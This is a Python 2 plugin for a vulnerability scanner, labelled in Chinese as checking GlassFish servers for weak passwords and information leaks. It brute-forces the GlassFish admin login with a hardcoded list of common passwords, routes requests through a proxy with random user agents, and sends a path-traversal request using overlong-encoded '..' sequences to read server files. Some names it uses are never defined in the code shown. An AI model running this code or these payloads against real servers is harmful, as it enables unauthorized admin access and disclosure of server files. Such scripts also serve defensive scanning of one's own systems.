#!/usr/bin/env python
# coding:utf-8
import logging
import lib.requests as requests
import random
from lib.config import (
    PASSWORD_DIC, MY_PROXY, USER_AGENT_LIST
)

def plugin_info():
    return {
        "name": "glassfish_vul",
        "info": "GlassFish弱口令或信息泄漏",
        "Author":"Jaqen",
        "Create_date":"2017-10-01"
    }

def exploit(ip):
    result = []
    if Domain:
        for domain in Domain:
            try:
                login_url = domain+'/common/j_security_check'
                resp = requests.get(login_url, timeout=TIME_OUT, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
            except Exception,e:
                logging.error(e)
                continue
            if "GlassFish Server" in resp.text:
                result.append('%s >>>> 存在GlassFish管理口'%domain)
                flag_list=['GlassFish Console - Common Tasks','/resource/common/js/adminjsf.js">','Admin Console</title>','src="/homePage.jsf"','src="/header.jsf"','<title>Common Tasks</title>','title="Logout from GlassFish']
                user_list=['admin']
                pass_list=['admin','glassfish','password','123456','12345678','123456789','admin123','admin888','admin1','administrator','8888888','123123','manager','root']
                for user in user_list:
                    for password in pass_list:
                        try:
                            login_url = domain+'/common/j_security_check'
                            data = {'j_username':user, 'j_password':password, 'loginButton':'Login', 'loginButton.DisabledHiddenField':'true'}
                            print data
                            resp = requests.post(login_url, data=data, timeout=TIME_OUT, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, proxies=MY_PROXY, allow_redirects=True, verify=False)
                        except Exception,e:
                            logging.error(e)
                            continue
                        for flag in flag_list:
                            if flag in resp.text:
                                print flag
                                result.append('%s >>>> 存在GlassFish弱口令%s:%s'%(domain,user,password))
            url = domain+"/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/"
            try:
                resp = requests.get(url, timeout=TIME_OUT, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, proxies=MY_PROXY, allow_redirects=True, verify=False)
            except Exception,e:
                logging.error(e)
                continue
            if "package-appclient.xml" in resp.text:
                result.append('%s >>>> 存在GlassFish文件读取'%domain)
        if len(result):
            return result